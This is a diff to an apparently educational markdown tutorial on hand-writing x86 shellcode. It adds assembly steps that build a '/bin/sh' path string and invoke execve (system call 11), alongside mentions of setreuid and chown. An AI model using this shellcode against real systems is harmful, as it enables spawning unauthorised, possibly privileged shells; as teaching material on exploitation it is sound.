@@ -113,6 +113,7 @@
             movl $11, %eax
             leal 8(%ebx), %ecx
             leal 12(%ebx), %edx
+          
             int $0x80
 
 #### `setreuid`
@@ -143,7 +144,26 @@ Note that the parameters *argv* and *envp* should get the type as 'const char *'
 
 * (Purple) Set the null pointer to terminate two parameter arrays, *argv* and *envp*. It can be expressed as 0x0000. Put it on the 12~15th characters so that it can be used for both *argv* (\[filepath, NULL\]) and *envp*. (\[NULL\])
 
-To sum up, one of the methods to define the variable `filepath` is "/bin/shXAAAABBBB".
+#### Programming `execve`
+
+One of the methods to define the variable `filepath` is "/bin/shXAAAABBBB".
+
+Move 0 to `eax` by doing
+
+    movl $0, %eax
+
+And move other contents around `ebx` with the register indirect addressing modes.
+
+    movl $filepath, %ebx
+    movb %al, 7(%ebx)
+    movl %ebx, 8(%ebx)
+    movl %eax, 12(%ebx)
+
+After moving 0s from `eax`, move 11 to it to execute `execve`, the system call #11. Also set `ecx` and `edx` as its arguments.
+
+    movl $11, %eax
+    leal 8(%ebx), %ecx
+    leal 12(%ebx), %edx
 
 ### File Permission
 #### `chown`
